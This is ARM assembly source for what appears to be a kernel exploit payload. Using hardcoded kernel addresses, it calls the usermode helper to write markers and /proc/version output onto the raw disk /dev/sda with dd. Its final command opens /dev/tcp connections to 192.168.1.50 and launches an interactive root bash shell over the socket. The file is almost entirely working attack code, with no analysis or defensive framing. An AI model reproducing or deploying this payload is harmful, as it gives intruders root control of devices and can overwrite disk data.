.syntax unified
.arm
.global _start
.section .text
_start:
    ldr     r4, saved_ip_addr
    ldr     sp, [r4]
    sub     sp, sp, #0x400
    bic     sp, sp, #7
    sub     sp, sp, #0x80

    mov     r11, #1
    sub     r11, r11, #1          @ r11 = 0
    movw    r10, #0x8c00
    movt    r10, #0xc000

    @ sockaddr_in at sp+4
    movw    r0, #0x0002
    movt    r0, #0x5c11

    str     r0, [sp, #0x04]
    movw    r0, #0xa8c0
    movt    r0, #0x3201

    str     r0, [sp, #0x08]
    str     r11, [sp, #0x0c]
    str     r11, [sp, #0x10]

    @ ---- UMH #0: dd (verified ELF): /proc/version -> LBA 5 ----
    movw    r8, #0x8c40
    movt    r8, #0xc000
    adr     r6, probe_path
    str     r6, [r8, #0x04]
    adr     r6, probe_arg0
    str     r6, [r8, #0x08]
    adr     r6, probe_arg1
    str     r6, [r8, #0x0c]
    adr     r6, probe_arg2
    str     r6, [r8, #0x10]
    adr     r6, probe_arg3
    str     r6, [r8, #0x14]
    adr     r6, probe_arg4
    str     r6, [r8, #0x18]
    adr     r6, probe_arg5
    str     r6, [r8, #0x1c]
    str     r11, [r8, #0x20]
    adr     r6, probe_path
    mov     r0, r6
    add     r1, r8, #4
    mov     r2, r11
    mov     r3, r11
    ldr     r4, umh_addr
    blx     r4
    str     r0, [r10, #0x1c]      @ header word 6: dd/UMH probe

    movw    r0, #1000
    ldr     r4, msleep_addr
    blx     r4

    @ ---- UMH #1: bash + dd marker A at offset 1536 (unpatched) ----
    movw    r8, #0x8c60
    movt    r8, #0xc000

    adr     r6, path
    str     r6, [r8, #0x04]
    adr     r6, arg_c
    str     r6, [r8, #0x08]
    adr     r6, cmd_a
    str     r6, [r8, #0x0c]
    str     r11, [r8, #0x10]
    adr     r6, path
    mov     r0, r6
    add     r1, r8, #4
    mov     r2, r11
    mov     r3, r11
    ldr     r4, umh_addr
    blx     r4
    str     r0, [r10, #0x14]      @ header word 4

    @ give the unpatched helper time to run
    movw    r0, #1500
    ldr     r4, msleep_addr
    blx     r4

    @ ---- UMH #2: marker B + reverse root shell on port+1 ----
    movw    r8, #0x8c80
    movt    r8, #0xc000

    adr     r6, path
    str     r6, [r8, #0x04]
    adr     r6, arg_c
    str     r6, [r8, #0x08]
    adr     r6, cmd_b
    str     r6, [r8, #0x0c]
    str     r11, [r8, #0x10]
    adr     r6, path
    mov     r0, r6
    add     r1, r8, #4
    mov     r2, r11
    mov     r3, r11
    ldr     r4, umh_addr
    blx     r4
    str     r0, [r10, #0x18]      @ header word 5

park:
    movw    r0, #0xffff
    movt    r0, #0x7fff
    ldr     r4, park_addr
    blx     r4
    b       park

fail:
    ldr     r4, emergency_restart_addr
    blx     r4
    b       fail

path:    .asciz "/bin/bash"
    .balign 4, 0x41
arg_c:   .asciz "-c"
    .balign 4, 0x41
cmd_a:   .asciz "printf MUSL-UMH-A|/usr/bin/dd of=/dev/sda bs=512 seek=3 count=1 conv=notrunc 2>/dev/null"
    .balign 4, 0x41
cmd_b:   .asciz "printf MUSL-UMH-B|/usr/bin/dd of=/dev/sda bs=512 seek=4 count=1 conv=notrunc 2>/dev/null;i=0;while [ $i -lt 150 ];do (exec 3<>/dev/tcp/192.168.1.50/4444) 2>/dev/null&&break;sleep 2;i=$((i+1));done;exec 9<>/dev/tcp/192.168.1.50/4445;printf 'MUSL-SHELL uid=%s\\n' \"$UID\" >&9;exec /bin/bash -i <&9 >&9 2>&9"
    .balign 4, 0x41
probe_path: .asciz "/usr/bin/dd"
    .balign 4, 0x41
probe_arg0: .asciz "if=/proc/version"
    .balign 4, 0x41
probe_arg1: .asciz "of=/dev/sda"
    .balign 4, 0x41
probe_arg2: .asciz "bs=512"
    .balign 4, 0x41
probe_arg3: .asciz "seek=5"
    .balign 4, 0x41
probe_arg4: .asciz "count=1"
    .balign 4, 0x41
probe_arg5: .asciz "conv=notrunc"
    .balign 4, 0x41


send_buf:
    push    {r4, r5, r6, r7, r8, lr}
    sub     sp, sp, #0x30
    mov     r6, sp
    mov     r7, r1               @ size
    mov     r8, r0               @ buffer
    mov     r5, #1
    sub     r5, r5, #1           @ r5 = 0
    str     r5, [r6, #0x04]      @ msg_name
    str     r5, [r6, #0x08]      @ msg_namelen
    add     r2, r6, #0x24
    str     r2, [r6, #0x0c]      @ msg_iov
    mov     r2, #1
    str     r2, [r6, #0x10]      @ msg_iovlen
    str     r5, [r6, #0x14]      @ msg_control
    str     r5, [r6, #0x18]      @ msg_controllen
    str     r5, [r6, #0x1c]      @ msg_flags
    str     r8, [r6, #0x24]      @ kvec.base
    str     r7, [r6, #0x28]      @ kvec.len
    mov     r0, r9               @ sock
    add     r1, r6, #0x04        @ msghdr
    add     r2, r6, #0x24        @ kvec
    mov     r3, #1               @ num
    push    {r7, r12}            @ 5th arg = size, keeps sp 8-byte aligned
    ldr     r4, kernel_sendmsg_addr
    blx     r4
    add     sp, sp, #8
    add     sp, sp, #0x30
    pop     {r4, r5, r6, r7, r8, pc}

    .balign 4, 0x41
saved_ip_addr:          .word 0xc0008cc0
sock_create_addr:       .word 0xc03c0f8c
kernel_connect_addr:    .word 0xc03c1500
kernel_sendmsg_addr:    .word 0xc03c1134
umh_addr:               .word 0xc0039a78
msleep_addr:            .word 0xc05fc3d5
coherent_addr:          .word 0xc001cba8
uep_addr:               .word 0xc01cdecc
uep_word0:              .word 0xe3a00002
uep_word1:              .word 0xe12fff1e
park_addr:              .word 0xc05fc3d5
emergency_restart_addr: .word 0xc05faa9d
